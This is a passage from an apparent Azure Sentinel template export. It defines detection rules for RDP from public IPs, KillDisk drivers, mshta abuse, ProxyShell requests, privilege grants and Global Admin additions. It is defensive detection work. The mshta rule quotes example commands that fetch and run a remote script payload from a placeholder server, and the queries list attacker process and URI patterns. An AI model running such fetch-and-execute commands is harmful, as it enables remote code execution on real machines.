        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/BV-277')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/BV-277')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "BV-277: [Hygiene] Windows Events - Public IP RDP Sessions",
          "description": "This alert is triggered when successful RDP sessions from Public IPs are detected in the Windows event logs. MITRE: T1563 Category: Windows Events tag: Hygiene",
          "severity": "High",
          "enabled": true,
          "query": "Event\n| where TimeGenerated >= ago(1h)\n|where EventLog == 'Microsoft-Windows-TerminalServices-LocalSessionManager/Operational'\n| extend Activity = extract('(Session (.+) succeeded)', 1, RenderedDescription)\n| extend RDPUser = extract('succeeded:.+?User: (.+) Session', 1, RenderedDescription)\n| extend IPAddress = extract('Network Address: (.+)', 1, RenderedDescription)\n| extend PrivateIP = ipv4_is_private(IPAddress)\n// only Public Source IPs\n| where PrivateIP == false\n|   mv-apply i = A277_WHITELISTED_IPS on (  \n      extend excluded_ip = ipv6_is_match(IPAddress, tostring(i))\n      | summarize excluded_ip = countif(excluded_ip)\n) \n| where excluded_ip == 0\n| where RDPUser <> '' and IPAddress <> ''\n| where tolower(Computer) matches regex tolower(A277_WHITELISTED_COMPUTERS) == false\n| extend AccountId = tostring(split(RDPUser, '\\\\')[-1])\n| extend AccountDomain = tostring(split(RDPUser, '\\\\')[-2])\n| project\n    TimeGenerated,\n    HostCustomEntity=Computer,\n    AccountCustomEntity=AccountId,\n    AccountDomain,\n    Activity,\n    IPCustomEntity=IPAddress\n| summarize SessionCount=count(), TimeGenerated=min(TimeGenerated)by HostCustomEntity, AccountCustomEntity, AccountDomain, IPCustomEntity",
          "queryFrequency": "PT1H",
          "queryPeriod": "PT1H",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT6H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "LateralMovement"
          ],
          "techniques": [
            "T1563"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": false,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT1H",
              "matchingMethod": "Selected",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "Host",
              "fieldMappings": [
                {
                  "identifier": "HostName",
                  "columnName": "HostCustomEntity"
                }
              ]
            },
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "Name",
                  "columnName": "AccountCustomEntity"
                },
                {
                  "identifier": "NTDomain",
                  "columnName": "AccountDomain"
                }
              ]
            },
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "IPCustomEntity"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/BV-2502')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/BV-2502')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "BV-2502: [SOC] Windows - TrojanKilldisk Driver Write",
          "description": "Adversaries may configure system settings to automatically execute a program during system boot or logon to maintain persistence or gain higher-level privileges on compromised systems. Operating systems may have mechanisms for automatically running a program on system boot or account logon.\n\nThese mechanisms may include automatically executing programs that are placed in specially designated directories or are referenced by repositories that store configuration information, such as the Windows Registry. An adversary may achieve the same goal by modifying or extending features of the kernel.\n\nThis rule identifies the drivers associated with TrojanKillDisk\n\nref:  https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/ukraine-wiper-malware-russia\n\nInclusions: None \nExclusions: None \n\nConsiderations: \n1. Review additional activity on for the user including login events\n2. Review additional activity on the host MITRE: T1547 Category: Windows Security tag: SOC tag: Zero-Day",
          "severity": "High",
          "enabled": true,
          "query": "let start_time = 10m;\nlet latency = 50m;  \nSecurityEvent\n| where TimeGenerated between (ago(start_time + latency) .. now()) and ingestion_time() > ago(start_time)\n| where EventID == 4663\n| where AccessMask == '0x2'\n| where ObjectName has_any ('DRV_X64.sys', 'DRV_X86.sys', 'DRV_XP_X64.sys', 'DRV_XP_X86.sys', 'empntdrv.sys')\n| parse Computer with ComputerName '.' ComputerDomain\n| extend ExtendedDescription = strcat('Computer ', ComputerName, ' loaded object ', ObjectName, ' which is commonly associated with TrojanKillDisk')\n| extend bv_mapping_tag = Computer\n| project TimeGenerated, ExtendedDescription, ProcessName, ObjectName, Process, SubjectAccount, SubjectDomainName, SubjectUserName, Computer, ComputerName, ComputerDomain, bv_mapping_tag",
          "queryFrequency": "PT10M",
          "queryPeriod": "PT1H",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT6H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "Persistence",
            "PrivilegeEscalation"
          ],
          "techniques": [
            "T1547"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5M",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": {
            "alertDescriptionFormat": "Adversaries may configure system settings to automatically execute a program during system boot or logon to maintain persistence or gain higher-level privileges on compromised systems. Operating systems may have mechanisms for automatically running a program on system boot or account logon.\n\nThese mechanisms may include automatically executing programs that are placed in specially designated directories or are referenced by repositories that store configuration information, such as the Windows Registry. An adversary may achieve the same goal by modifying or extending features of the kernel.\n\nThis rule identifies the drivers associated with TrojanKillDisk\n\n{{ExtendedDescription}}\n\nref:  https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/ukraine-wiper-malware-russia\n\nInclusions: None \nExclusions: None \n\nConsiderations: \n1. Review additional activity on for the user including login events\n2. REview additional activity on the host\n\nMITRE: T1547 \nCategory: Windows Security\ntag: SOC"
          },
          "customDetails": {
            "bvtag": "bv_mapping_tag"
          },
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "Name",
                  "columnName": "SubjectAccount"
                },
                {
                  "identifier": "NTDomain",
                  "columnName": "SubjectDomainName"
                }
              ]
            },
            {
              "entityType": "Host",
              "fieldMappings": [
                {
                  "identifier": "HostName",
                  "columnName": "ComputerName"
                },
                {
                  "identifier": "DnsDomain",
                  "columnName": "ComputerDomain"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      }
    ]
  },
  {
    "$schema": "https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#",
    "contentVersion": "1.0.0.0",
    "parameters": {
      "workspace": {
        "type": "String"
      }
    },
    "resources": [
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/BV-2504')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/BV-2504')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "BV-2504: [SOC] Windows - Suspicious Parent Process For mshta.exe",
          "description": "Adversaries may abuse mshta.exe to proxy execution of malicious .hta files and Javascript or VBScript through a trusted Windows utility. There are several examples of different types of threats leveraging mshta.exe during initial compromise and for execution of code\n\nMshta.exe is a utility that executes Microsoft HTML Applications (HTA) files. HTAs are standalone applications that execute using the same models and technologies of Internet Explorer, but outside of the browser.\n\nFiles may be executed by mshta.exe through an inline script: mshta vbscript:Close(Execute(\"GetObject(\"\"script:https[:]//webserver/payload[.]sct\"\")\"))\n\nThey may also be executed directly from URLs: mshta http[:]//webserver/payload[.]hta\n\nMshta.exe can be used to bypass application control solutions that do not account for its potential use. Since mshta.exe executes outside of the Internet Explorer's security context, it also bypasses browser security settings\n\nThis rule identifies suspicious parent processes for mshta.exe\n\nInclusions: None \nExclusions: None \n\nConsiderations: \n1. Review additional activity on for the user including login events\n2. Review additional activity on the host MITRE: T1218 Category: Windows Security tag: SOC tag: Zero-Day",
          "severity": "High",
          "enabled": true,
          "query": "let start_time = 15m;\nlet latency = 60m;\nlet end_time = now();\nSecurityEvent\n| where TimeGenerated between (ago(latency + start_time) .. end_time) and ingestion_time() > ago(start_time)\n| where EventID == 4688\n| where NewProcessName contains 'mshta.exe'\n| where ParentProcessName  has_any ('rundll32.exe', 'cscript.exe', 'wscript.exe', 'powershell.exe', 'hh.exe', 'temp', 'svchost.exe', 'cmd.exe', @'Users\\Public', 'excel.exe', 'winword.exe')\n| parse Computer with ComputerName '.' ComputerDomain\n| extend ProcessName = NewProcessName\n| extend ExtendedDescription = strcat('Computer ', ComputerName, 'executed mshta.exe with suspicious parent process ', ParentProcessName)\n| summarize TimeGenerated=max(TimeGenerated), ProcessName=make_set(ProcessName, 5), CommandLine=make_set(CommandLine, 5) by Computer, ComputerName, ComputerDomain, SubjectUserName, SubjectDomainName, ExtendedDescription, ParentProcessName\n| extend VictimEntity = pack_array(SubjectUserName, ComputerName), bv_mapping_tag = Computer\n| project TimeGenerated, VictimEntity, ExtendedDescription, Computer, ProcessName,ParentProcessName, ComputerName, ComputerDomain, SubjectUserName, SubjectDomainName, CommandLine, bv_mapping_tag",
          "queryFrequency": "PT15M",
          "queryPeriod": "PT1H15M",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT6H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "DefenseEvasion"
          ],
          "techniques": [
            "T1218"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5M",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": {
            "alertDescriptionFormat": "Adversaries may abuse mshta.exe to proxy execution of malicious .hta files and Javascript or VBScript through a trusted Windows utility. There are several examples of different types of threats leveraging mshta.exe during initial compromise and for execution of code\n\nMshta.exe is a utility that executes Microsoft HTML Applications (HTA) files. HTAs are standalone applications that execute using the same models and technologies of Internet Explorer, but outside of the browser.\n\nFiles may be executed by mshta.exe through an inline script: mshta vbscript:Close(Execute(\"GetObject(\"\"script:https[:]//webserver/payload[.]sct\"\")\"))\n\nThey may also be executed directly from URLs: mshta http[:]//webserver/payload[.]hta\n\nMshta.exe can be used to bypass application control solutions that do not account for its potential use. Since mshta.exe executes outside of the Internet Explorer's security context, it also bypasses browser security settings\n\nThis rule identifies suspicious parent processes for mshta.exe\n\n{{ExtendedDescription}}\n\nInclusions: None \nExclusions: None \n\nConsiderations: \n1. Review additional activity on for the user including login events\n2. Review additional activity on the host\n\nMITRE: T1218 \nCategory: Windows Security\ntag: SOC"
          },
          "customDetails": {
            "VictimEntity": "VictimEntity",
            "bvtag": "bv_mapping_tag"
          },
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "Name",
                  "columnName": "SubjectUserName"
                },
                {
                  "identifier": "NTDomain",
                  "columnName": "SubjectDomainName"
                }
              ]
            },
            {
              "entityType": "Host",
              "fieldMappings": [
                {
                  "identifier": "HostName",
                  "columnName": "ComputerName"
                },
                {
                  "identifier": "DnsDomain",
                  "columnName": "ComputerDomain"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/BV-134')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/BV-134')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "BV-134: [RBA] O365 - Policy Tampering",
          "description": "Identifies if any tampering is done to either auditlog, ATP Safelink, SafeAttachment, AntiPhish or Dlp policy. An adversary may use this technique to evade detection or avoid other policy based defenses. References: https://docs.microsoft.com/en-us/powershell/module/exchange/advanced-threat-protection/remove-antiphishrule?view=exchange-ps. MITRE: T0853,T0889,T1543 Category: Office 365 tag: RBA",
          "severity": "Medium",
          "enabled": true,
          "query": "let timeframe = 1d;\nOfficeActivity\n| where tolower(UserId) matches regex tolower(MICROSOFT_OFFICE_OPERATIONS_ACCOUNTS) == false\n| where TimeGenerated >= ago(timeframe)\n| where RecordType =~ 'ExchangeAdmin'\n| where UserType in~ ('Admin','DcAdmin') \n| where Operation startswith 'Remove-' or Operation startswith 'Disable-'\n| where Operation contains 'AntiPhish' or Operation contains 'SafeAttachment' \n  or Operation contains 'SafeLinks' or Operation contains 'Dlp' or Operation contains 'Audit'\n| summarize OperationCount = count() by Operation, UserId, ClientIP, ResultStatus\n| extend AccountCustomEntity = UserId, IPCustomEntity = ClientIP",
          "queryFrequency": "P1D",
          "queryPeriod": "P1D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT6H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "Execution",
            "Persistence"
          ],
          "techniques": [
            "T0853",
            "T0889",
            "T1543"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": false,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT1H",
              "matchingMethod": "Selected",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "AlertPerResult"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "AccountCustomEntity"
                }
              ]
            },
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "IPCustomEntity"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/BV-1502')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/BV-1502')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "BV-1502: [RBA] Windows - System Security Access Granted To An Account",
          "description": "This alerts every time local logon user right policy is changed and logon right was granted to an account. MITRE: T1053 Category: Windows Security tag: RBA",
          "severity": "High",
          "enabled": true,
          "query": "let EventIDList = dynamic([4717]);\nlet latency = 1h;\nlet start_time = 1h;\nlet end_time = now();\nlet alert_bin = 1h;  \nlet SourceInformation = \nSecurityEvent\n| where TimeGenerated between (ago(latency + start_time) .. end_time)\n| summarize TargetUserName = take_anyif(TargetUserName, isnotempty(TargetUserName)) by TargetSid = tolower(TargetSid)\n;\nSecurityEvent\n|where TimeGenerated between (ago(latency + start_time) .. end_time) and ingestion_time() > ago(start_time)\n| where EventID in (EventIDList)\n| where SubjectUserName !endswith '$'\n| extend AccessGranted = extract(@'<Data Name=\"AccessGranted\">(.*?)</Data>', 1, EventData)\n| extend TargetSid = tolower(TargetSid)\n| join kind=leftouter (SourceInformation) on TargetSid\n| summarize bv_start_time = arg_min(TimeGenerated, *), bv_event_count = count(), bv_access_rights = make_set(AccessGranted, 10) by bv_src_user = SubjectUserName, bv_dest_user_sid = TargetSid\n| extend bv_src_user_sid = SubjectUserSid, bv_dest_user = TargetUserName1\n| extend bv_dest_user = iff(isnotempty(bv_dest_user), bv_dest_user, 'Unknown')\n| extend ExtendedDescription = strcat(\n    'bv_start_time: ', bv_start_time\n    ,'\\nbv_src_user: ', bv_src_user\n    ,'\\nbv_src_user_sid: ', bv_src_user_sid\n    ,'\\nbv_dest_user: ', bv_dest_user\n    ,'\\nbv_dest_user_sid: ', bv_dest_user_sid\n    ,'\\nbv_access_rights: ', bv_access_rights\n    ,'\\nbv_access_rights_cnt: ', array_length(bv_access_rights))\n| extend VictimEntity = pack_array(bv_dest_user), AttackerEntity = pack_array(bv_src_user)\n| extend RBAScore = iff(array_length(set_intersect(A1502_SPECIAL_RIGHTS, bv_access_rights)) > 0, 3, 1)\n| project \n    bv_start_time\n    , bv_src_user\n    , bv_src_user_sid\n    , bv_dest_user\n    , bv_dest_user_sid\n    , bv_access_rights\n    , ExtendedDescription\n    , bv_event_count\n    , AttackerEntity\n    , VictimEntity\n    , RBAScore",
          "queryFrequency": "PT1H",
          "queryPeriod": "PT2H",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT6H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "Persistence",
            "Execution",
            "PrivilegeEscalation"
          ],
          "techniques": [
            "T1053"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": false,
            "groupingConfiguration": {
              "enabled": true,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT1H",
              "matchingMethod": "Selected",
              "groupByEntities": [
                "Account"
              ],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "AlertPerResult"
          },
          "alertDetailsOverride": {
            "alertDescriptionFormat": "This alerts every time local logon user right policy is changed and logon right was granted to an account.\n\n{{ExtendedDescription}}\n\nMITRE: T1053\nCategory: Windows Security\ntag: RBA"
          },
          "customDetails": {
            "AttackerEntity": "AttackerEntity",
            "VictimEntity": "VictimEntity",
            "RBAScore": "RBAScore"
          },
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "Name",
                  "columnName": "bv_src_user"
                }
              ]
            },
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "Name",
                  "columnName": "bv_dest_user"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/BV-1315')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/BV-1315')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "BV-1315: [SOC] IIS - Powershell AutoDiscover",
          "description": "This query identifies activity associated with CVE-2022-41040, CVE-2022-41082 and CVE-2022-42040 currently referred to as ProxyShell. MITRE: T1190 Category: Windows Security tag: Zero-Day tag: SOC",
          "severity": "High",
          "enabled": true,
          "query": "let start_time=1h;\nlet end_time=now();\nlet latency = 1h;\nW3CIISLog\n| where TimeGenerated between (ago(latency + start_time) .. end_time) and ingestion_time() > ago(start_time)\n| where (csUriStem contains 'autodiscover.json' and csUriQuery contains \"PowerShell\") or csUriQuery contains 'autodiscover/admin@localhost' or csUriQuery contains 'zdi/PowerShell'\n| where csMethod =~ \"POST\"\n| where scStatus == '200'\n|project TimeGenerated, sIP, cIP, csUserAgent, csMethod, csUriQuery , Computer\n|extend AttackerEntity = cIP\n|extend VictimEntity = pack_array(sIP, Computer)\n|extend ExtendedDescription = strcat('Potential Powershell autodiscover activity discovered from external entity ', AttackerEntity, ' with uri query ', csUriQuery, ' on local system ', VictimEntity)\n| extend bv_mapping_tag = sIP\n|project TimeGenerated, sIP, cIP, csUserAgent, csMethod, csUriQuery , Computer, AttackerEntity, VictimEntity, ExtendedDescription, bv_mapping_tag",
          "queryFrequency": "PT1H",
          "queryPeriod": "PT2H",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT6H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "InitialAccess"
          ],
          "techniques": [
            "T1190"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5M",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "AlertPerResult"
          },
          "alertDetailsOverride": {
            "alertDescriptionFormat": "This query identifies activity associated with CVE-2022-41040, CVE-2022-41082 and CVE-2022-42040 currently referred to as ProxyShell.\n\nReferences:\nhttps://msrc-blog.microsoft.com/2022/09/29/customer-guidance-for-reported-zero-day-vulnerabilities-in-microsoft-exchange-server/\nhttps://www.zerodayinitiative.com/blog/2022/11/14/control-your-types-or-get-pwned-remote-code-execution-in-exchange-powershell-backend\n{{ExtendedDescription}}\ntag: SOC\ntag: Zero-Day\nCategory: Windows Security\nMITRE: T1190"
          },
          "customDetails": {
            "VictimEntity": "VictimEntity",
            "AttackerEntity": "AttackerEntity",
            "bvtag": "bv_mapping_tag"
          },
          "entityMappings": [
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "cIP"
                }
              ]
            },
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "sIP"
                }
              ]
            },
            {
              "entityType": "Host",
              "fieldMappings": [
                {
                  "identifier": "HostName",
                  "columnName": "Computer"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/BV-844')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/BV-844')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "BV-844: [SOC] Linux - OMIG SCX RunAsProvider ExecuteShellCommand",
          "description": "This hunting query uses Audited security events collected via the Syslog data connector to explore the use of the SCX RunAsProvider Invoke_ExecuteShellCommand to execute any UNIX/Linux command using the /bin/sh shell. SCXcore, started as the Microsoft Operations Manager UNIX/Linux Agent, is now used in a host of products including Microsoft Operations Manager. Microsoft Azure, and Microsoft Operations Management Suite. MITRE: T1595,T1190 Category: Linux tag: SOC",
          "severity": "High",
          "enabled": true,
          "query": "Syslog\n| parse SyslogMessage with \"type=\" EventType \" audit(\" * \"): \" EventData\n| where EventType =~ \"AUOMS_EXECVE\" and EventData has '/var/opt/microsoft/scx/tmp'\n| project TimeGenerated, EventType, Computer, EventData\n| parse EventData with * \"syscall=\" syscall \" syscall_r=\" * \" success=\" success \" exit=\" exit \" a0\" * \" ppid=\" ppid \" pid=\" pid \" audit_user=\" audit_user \" auid=\" auid \" user=\" user \" uid=\" uid \" group=\" group \" gid=\" gid \"effective_user=\" effective_user \" euid=\" euid \" set_user=\" set_user \" suid=\" suid \" filesystem_user=\" filesystem_user \" fsuid=\" fsuid \" effective_group=\" effective_group \" egid=\" egid \" set_group=\" set_group \" sgid=\" sgid \" filesystem_group=\" filesystem_group \" fsgid=\" fsgid \" tty=\" tty \" ses=\" ses \" comm=\\\"\" comm \"\\\" exe=\\\"\" exe \"\\\"\" * \"cwd=\\\"\" cwd \"\\\"\" * \"name=\\\"\" name \"\\\"\" * \"cmdline=\\\"\" cmdline \"\\\" containerid=\" containerid\n| where uid == '0'\n| where cwd == '/var/opt/microsoft/scx/tmp'\n| where comm == 'sh'\n| extend Timestamp = TimeGenerated, HostCustomEntity = Computer, AccountCustomEntity = user\n| extend bv_mapping_tag = AccountCustomEntity",
          "queryFrequency": "PT1H",
          "queryPeriod": "PT1H",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT6H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "InitialAccess",
            "Reconnaissance"
          ],
          "techniques": [
            "T1595",
            "T1190"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5M",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "AlertPerResult"
          },
          "alertDetailsOverride": null,
          "customDetails": {
            "bvtag": "bv_mapping_tag"
          },
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "Name",
                  "columnName": "AccountCustomEntity"
                }
              ]
            },
            {
              "entityType": "Host",
              "fieldMappings": [
                {
                  "identifier": "HostName",
                  "columnName": "HostCustomEntity"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/BV-556')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/BV-556')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "BV-556: [RBA] Azure AD - New Global Admin",
          "description": "User added to the Global Admin role. MITRE: T1098 Category: Azure AD tag: RBA",
          "severity": "Low",
          "enabled": true,
          "query": "let alert_bin=1d;\nlet start_time = 30d;\nlet end_time = now();\nlet latency = 1d;\nAuditLogs\n| where TimeGenerated between (ago(latency +start_time)..end_time) and ingestion_time() > ago(start_time)\n| where OperationName == 'Add member to role' and AADOperationType == 'Assign' and Result == 'success'\n| mv-expand TargetResources\n| extend modifiedProperties = parse_json(TargetResources).modifiedProperties\n| mv-expand modifiedProperties\n| extend DisplayName = tostring(parse_json(modifiedProperties).displayName), GroupName = tostring(parse_json(modifiedProperties).newValue)\n| where GroupName has 'TenantAdmins'\n| extend Initiator = tostring(parse_json(tostring(InitiatedBy.user)).userPrincipalName)\n| extend TargetUserPrincipalName = tostring(TargetResources.userPrincipalName)\n| extend ipAddress = tostring(parse_json(tostring(InitiatedBy.user)).ipAddress)\n| where Identity !in (A556_WHITELISTED_IDENTITIES)\n| extend GroupName = replace('\"','',GroupName)\n| project TimeGenerated, Initiator, Identity, IPCustomEntity=ipAddress, TargetUserPrincipalName, AADOperationType, OperationName, GroupName\n| extend AccountCustomEntity = TargetUserPrincipalName\n| summarize TimeGenerated=min(TimeGenerated), Count=count(), Operations=make_set(AADOperationType), Identity=make_set(Identity) by AccountCustomEntity, Initiator, bin(TimeGenerated, alert_bin)\n| parse AccountCustomEntity with UserName '@' UserDNS\n| extend VictimEntity = pack_array(UserName)\n| extend AttackerEntity = pack_array(Initiator)\n| extend ExtendedDescription = strcat(Initiator, ' added ', AccountCustomEntity, ' to a Global Admin Role')\n| project TimeGenerated, AccountCustomEntity, Count, Operations, Identity, UserName, UserDNS, VictimEntity, AttackerEntity, Initiator, ExtendedDescription, RBAScore=1",
          "queryFrequency": "P1D",
          "queryPeriod": "P2D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT6H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "Persistence"
          ],
          "techniques": [
            "T1098"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": false,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT1H",
              "matchingMethod": "Selected",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "AlertPerResult"
          },
          "alertDetailsOverride": {
            "alertDescriptionFormat": "{{ExtendedDescription}}\n\nCategory: Azure AD\ntag: RBA\nMITRE: T1098"
          },
          "customDetails": {
            "VictimEntity": "VictimEntity",
            "AttackerEntity": "AttackerEntity",
            "RBAScore": "RBAScore"
          },
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "Name",
                  "columnName": "UserName"
                },
                {
                  "identifier": "DnsDomain",
                  "columnName": "UserDNS"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/BV-1504')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/BV-1504')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "BV-1504: [SOC] Windows - Suspicious Scheduled Task Modification",
          "description": "This alerts every time a scheduled task is updated with suspicious parameters which might be indicative of initial or recurring execution of malicious code. MITRE: T1053 Category: Windows Security tag: SOC",
          "severity": "High",
